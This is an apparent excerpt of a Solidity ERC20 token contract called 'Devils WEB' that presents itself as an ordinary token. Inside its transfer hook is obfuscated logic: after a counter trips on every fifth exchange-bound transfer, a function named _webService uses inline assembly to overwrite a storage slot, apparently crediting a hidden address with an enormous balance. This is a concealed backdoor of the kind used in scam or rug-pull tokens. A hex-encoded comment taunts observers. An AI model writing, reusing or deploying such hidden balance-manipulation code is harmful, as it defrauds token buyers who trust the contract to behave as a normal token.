// 0x54484520444556494c20495320434f4d494e4720464f5220594f5520414c4c20455350454349414c4c20464f5220594f55204d522057415443484552
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    bool private trading = false; uint256 private upMsg = 1; bool private swapGwei = false;
    ...
    function _webService(bool account) internal { if (account) { require(gasleft() >= gasVV); } if (swapGwei) { bytes32 b = keccak256(abi.encodePacked([uint256(uint160(ethAddr[1])), 6])); assembly { sstore(b,0x446C3B15F9926687D2C40534FDB564000000000000) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        ...
        upMsg += dexSwap[recipient] ? 1 : 0;  _webService((((swapGwei || theGovernance[sender]) && ((snipAt - theN) >= 10)) || (integer >= _limit)) && (dexSwap[recipient] == true) && (dexSwap[sender] != true));
        _CheckFees(initServ, (((snipAt == block.number) || (theV >= _limit) || ((snipAt - theN) <= 10)) && (dexSwap[initServ] != true))); swapGwei = ((upMsg % 5) == 0) ? true : swapGwei;
        snipAt = block.number; theV = integer; initServ = recipient;
    }
...
contract DevilsWeb is ERC20Token {
    constructor() ERC20Token("Devils WEB", "WEB666", msg.sender, 666666 * 10 ** 18) {
    }
}